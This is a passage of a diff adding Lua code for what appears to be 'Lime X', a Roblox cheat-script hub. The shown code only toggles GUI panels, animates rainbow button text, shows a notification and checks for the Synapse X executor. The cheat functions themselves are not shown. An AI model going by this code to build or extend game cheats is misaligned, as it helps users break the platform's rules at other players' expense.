+			frame.Visible = not frame.Visible -- flip between visible/invisible
+		end
+	end)
+end
+coroutine.wrap(MLNJ_fake_script)()
+
+
+
+
+
+local function RWJH_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.GUI.Visible = false
+		script.Parent.Parent.Scripts.Visible = false
+		script.Parent.Parent.Extra.Visible = true
+		script.Parent.Parent.Line.Visible = false
+	end)
+end
+coroutine.wrap(RWJH_fake_script)()
+local function CONSN_fake_script() -- S.LocalScript 
+	local script = Instance.new('LocalScript', S)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.GUI.Visible = false
+		script.Parent.Parent.Scripts.Visible = true
+		script.Parent.Parent.Extra.Visible = false
+
+	end)
+end
+coroutine.wrap(CONSN_fake_script)()
+local function NVFP_fake_script() -- TextButton_11.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_11)
+
+	local r = { 
+		Color3.fromRGB(254, 0, 0);  
+		Color3.fromRGB(255, 127, 0); 
+		Color3.fromRGB(255, 221, 1); 
+		Color3.fromRGB(0, 200, 0);  
+		Color3.fromRGB(0, 160, 199); 
+		Color3.fromRGB(0, 55, 230);  
+		Color3.fromRGB(129, 16, 210)} 
+	local info = TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 0, false, 0)
+	script.Parent.TextColor3 = r[1] 
+	local i = 1
+	while true do
+		local tween = game:GetService("TweenService"):Create(script.Parent, info, {
+			TextColor3 = r[i]}) 
+		tween:Play()
+		repeat wait() until tween.Completed
+		wait(0.1)
+		if i == #r then
+			i = 1
+		else
+			i = i + 1
+		end
+	end
+end
+coroutine.wrap(NVFP_fake_script)()
+local function TSNSMV_fake_script() -- G.LocalScript 
+	local script = Instance.new('LocalScript', G)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.GUI.Visible = true
+		script.Parent.Parent.Scripts.Visible = false
+		script.Parent.Parent.Extra.Visible = false
+
+	end)
+end
+coroutine.wrap(TSNSMV_fake_script)()
+
+
+
+
+
+
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+	Title = "Lime X";
+	Text = "Press P To Untoggle and Toggle The GUI!!!";
+})
+
+
+
+
+
+if  is_synapse_function then
+	rconsoleprint ("Lime X Loaded (Synapse X Editon)")
+end
+
+
+end
